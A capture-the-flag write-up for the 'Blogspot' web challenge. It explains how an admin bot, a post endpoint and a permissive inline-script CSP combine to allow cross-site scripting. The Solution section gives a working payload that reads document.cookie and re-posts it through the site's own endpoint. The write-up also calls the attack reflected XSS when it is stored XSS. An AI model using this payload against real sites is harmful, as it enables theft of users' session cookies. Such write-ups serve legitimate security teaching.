# Blogspot
Category: Web | 425pts

## Challenge Description
> Jaga created an internal social media platform for the company, can you leak anyone's information?

## Analysis
Glancing through the source code provided and challenge website, we can guess that this challenge is about Cross-Site Scripting (XSS) attacks, more specifically reflected XSS, for the following reasons:
- There is an admin bot with the flag in its cookies that visits the posts everytime a new post is submitted
	<details>
	<summary>Relevant code from admin bot</summary>

	```js
	export const viewPosts = async () => {
		try {
			const browser = await puppeteer.launch(browser_options);
			let context = await browser.createIncognitoBrowserContext();
			let page = await context.newPage();

			let token = await sign({ username: 'admin' });
			await page.setCookie({
				name: "session",
				'value': token,
				domain: "127.0.0.1",
			});
			await page.setCookie({
				name: "flag",
				'value': "REDACTED",
				domain: "127.0.0.1",
			});
			await page.goto('http://127.0.0.1:1337/blog', {
				waitUntil: 'networkidle2',
				timeout: 8000
			});
			await browser.close();
		} catch(e) {
			console.log(e);
		}
	};
	```
	</details>

- There is a post endpoint that accepts a title and content, meaning we can control what the bot sees, or maybe even load a script when the bot visits the page
	<details>
	<summary>Relevant code from post endpoint</summary>

	```js
	router.post('/post', auth, async (req, res)=>{
        const { title, content } = req.body;
        if (title && content) {
            db.addPost(title, req.user.username, content)
                .then(async () => {
                    if (req.user.username != 'admin') { 
                        await viewPosts();
                    }
                    res.status(200).send(response('Success'))})
                .catch(() => {console.log('oof');res.status(500).send(response('Error'))});
        }
    });

	```
	</details>


## Approach
Taking a closer look at the source code provided, we can see that there is a content security policy (CSP) in place.
```js
app.use(function (req, res, next) {
	res.setHeader(
	  'Content-Security-Policy',
	  "default-src 'self'; script-src 'unsafe-inline' 'self' https://cdnjs.cloudflare.com; style-src-elem 'self' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; connect-src 'self';"
	);
	next();
  });
```
`script-src 'unsafe-inline'` means that we put scripts into posts and they will be run when the page is loaded, which is what we need to do to perform a reflected XSS attack. 

However, `connect-src 'self'` means that we cannot make any requests to other domains. As such, we cannot use a payload to make a request to a post bin with the data we want, `document.cookies` which is the flag in this case. While this limits what we can do, we can still leak the flag by making the bot send a POST request to the `/post` endpoint with the flag in the body and then viewing it on from the posts page directly.

## Solution
Hence, we can use the following payload as a post title to get the flag:
```html
qqq
<script>
	xhr4=new XMLHttpRequest();
	var url4='/post';
	var a=document.cookie;xhr4.open('POST',url4,true);
	xhr4.setRequestHeader('Content-Type','application/json');
	var data=JSON.stringify({"title":"here","content":a});
	xhr4.send(data);
</script>
```

## Explanation
Upon loading the post, the bot runs the script and sends a POST request to the `/post` endpoint with the flag (`document.cookie`) in the body. The flag is then displayed on the page.

## Flag
`STF22{s1mpl3_p0stxSs:)}`